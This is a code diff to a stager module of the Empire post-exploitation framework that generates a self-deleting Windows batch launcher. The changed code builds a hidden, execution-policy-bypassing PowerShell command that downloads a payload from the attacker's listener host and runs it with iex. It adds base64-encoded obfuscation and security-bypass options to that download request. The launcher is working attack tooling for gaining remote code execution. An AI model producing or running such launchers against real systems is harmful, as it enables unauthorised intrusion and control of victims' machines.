@@ -1,5 +1,6 @@
 from __future__ import print_function
 
+import base64
 from builtins import object
 
 from empire.server.common import helpers
@@ -17,14 +18,11 @@ class Stager(object):
                     "Link": "https://twitter.com/harmj0y",
                 }
             ],
-            "Description": "Generates a self-deleting .bat launcher for Empire.",
+            "Description": "Generates a self-deleting .bat launcher for Empire. Only works with the HTTP and HTTP COM listeners.",
             "Comments": [""],
         }
 
-        # any options needed by the stager, settable during runtime
         self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
             "Listener": {
                 "Description": "Listener to generate stager for.",
                 "Required": True,
@@ -36,11 +34,6 @@ class Stager(object):
                 "Value": "powershell",
                 "SuggestedValues": ["powershell"],
                 "Strict": True,
-            },
-            "StagerRetries": {
-                "Description": "Times for the stager to retry connecting.",
-                "Required": False,
-                "Value": "0",
             },
             "OutFile": {
                 "Description": "Filename that should be used for the generated output, otherwise returned as a string.",
@@ -66,21 +59,6 @@ class Stager(object):
                 "Required": False,
                 "Value": r"Token\All\1",
             },
-            "UserAgent": {
-                "Description": "User-agent string to use for the staging request (default, none, or other).",
-                "Required": False,
-                "Value": "default",
-            },
-            "Proxy": {
-                "Description": "Proxy to use for request (default, none, or other).",
-                "Required": False,
-                "Value": "default",
-            },
-            "ProxyCreds": {
-                "Description": "Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
-                "Required": False,
-                "Value": "default",
-            },
             "Bypasses": {
                 "Description": "Bypasses as a space separated list to be prepended to the launcher",
                 "Required": False,
@@ -93,37 +71,52 @@ class Stager(object):
         self.mainMenu = mainMenu
 
         for param in params:
-            # parameter format is [Name, Value]
             option, value = param
             if option in self.options:
                 self.options[option]["Value"] = value
 
     def generate(self):
-
         # extract all of our options
-        language = self.options["Language"]["Value"]
         listener_name = self.options["Listener"]["Value"]
         delete = self.options["Delete"]["Value"]
         obfuscate = self.options["Obfuscate"]["Value"]
         obfuscate_command = self.options["ObfuscateCommand"]["Value"]
-        user_agent = self.options["UserAgent"]["Value"]
-        proxy = self.options["Proxy"]["Value"]
-        proxy_creds = self.options["ProxyCreds"]["Value"]
-        stager_retries = self.options["StagerRetries"]["Value"]
         bypasses = self.options["Bypasses"]["Value"]
 
-        obfuscate_script = False
         if obfuscate.lower() == "true":
-            obfuscate_script = True
+            obfuscate = True
+        else:
+            obfuscate = False
 
         host = self.mainMenu.listeners.activeListeners[listener_name]["options"][
             "Host"
         ]["Value"]
-        launcher = f"powershell.exe -nol -w 1 -nop -ep bypass \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('{host}/download/powershell')|iex\""
+
+        launcher = f"powershell.exe -nol -w 1 -nop -ep bypass \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('{host}/download/powershell/"
+
+        # generate base64 of obfuscate command for first stage
+        if obfuscate:
+            launcher_obfuscate_command = f"{obfuscate_command}:"
+
+        else:
+            launcher_obfuscate_command = ":"
+
+        if bypasses:
+            launcher_bypasses = f"{bypasses}"
+        else:
+            launcher_bypasses = ""
+
+        launcher_end = base64.b64encode(
+            (launcher_obfuscate_command + launcher_bypasses).encode("UTF-8")
+        ).decode("UTF-8")
+        launcher_end += "') -UseBasicParsing|iex\""
+
+        launcher = launcher + launcher_end
 
         if host == "":
             print(helpers.color("[!] Error in launcher command generation."))
             return ""
+
         else:
             code = "@echo off\n"
             code += "start /b " + launcher + "\n"
